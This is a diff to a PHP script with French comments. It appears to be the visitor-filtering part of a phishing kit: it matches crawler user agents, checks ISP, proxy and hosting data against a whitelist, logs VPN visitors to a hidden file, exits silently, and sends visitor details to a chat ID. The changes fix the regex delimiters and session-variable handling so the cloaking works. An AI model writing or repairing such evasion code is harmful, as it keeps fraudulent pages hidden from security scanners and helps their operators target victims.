@@ -9,8 +9,8 @@ if (!$isps) {
 
 $_SESSION["lang"] = strtolower(substr($_SERVER["HTTP_ACCEPT_LANGUAGE"], 0, 2));
 
-# Crawler Liste
-$crawler = '/007ac9|';
+# Crawler Liste (Expression régulière avec délimiteurs corrigés)
+$crawler = '/007ac9|/';
 
 $ua = $_SERVER['HTTP_USER_AGENT'];
 $ip = $_SERVER['REMOTE_ADDR'];
@@ -66,7 +66,7 @@ function validate() {
 📡 User Agent   :".$_SERVER['HTTP_USER_AGENT']."";
         sendWL($message, $chatidclick);
     }
-  
+
     # Stoppe l'exécution du script sans afficher quoi que ce soit
     exit(); 
 }
@@ -103,10 +103,11 @@ $whitelisted_values = explode(',', $whitelist);
 
 if (!in_array($_SERVER['REMOTE_ADDR'],$whitelisted_values)) {
     
-    $isp = $_SESSION['isp'];
-    $org = $_SESSION['org'];
-    $proxy = $_SESSION['proxy'];
-    $hosting = $_SESSION['hosting'];
+    # Assurez-vous que les variables sont définies avant de les utiliser
+    $isp = isset($_SESSION['isp']) ? $_SESSION['isp'] : '';
+    $org = isset($_SESSION['org']) ? $_SESSION['org'] : '';
+    $proxy = isset($_SESSION['proxy']) ? $_SESSION['proxy'] : '';
+    $hosting = isset($_SESSION['hosting']) ? $_SESSION['hosting'] : '';
 
     if ($proxy || $hosting) {
         file_put_contents($_SERVER['DOCUMENT_ROOT'] . '/help/!#/bot.txt', $ip . ' - ' . date('d/m/Y h:i:s') . ' - ' . "PROXY / VPN\n", FILE_APPEND);
